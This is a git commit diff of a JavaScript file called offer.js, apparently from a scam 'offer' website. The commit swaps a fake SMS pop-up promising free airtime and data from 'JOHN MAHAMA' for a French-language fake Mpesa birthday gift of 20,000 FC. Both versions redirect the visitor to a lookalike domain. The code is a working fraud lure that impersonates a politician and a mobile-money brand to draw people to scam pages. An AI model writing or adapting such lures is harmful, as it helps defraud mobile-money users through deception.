e9854e027f65b5752d2a5a18aaceb5da0b6ac6e8
lagalfredben <lagalfredben@gmail.com>
2025-08-07 07:18:01 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '20.000FC'
+password=prompt('SMS: Félicitations, votre compte Mpesa est éligible pour recevoir le cadeau danniversaire Mpesa de 20.000FC. Veuillez cliquer sur OK POUR CONTINUER ','20.000FC');
+if (password != '20.000FC') {
+location.href='https://mpesa-drc.offer-it.live/gift';
+
 }
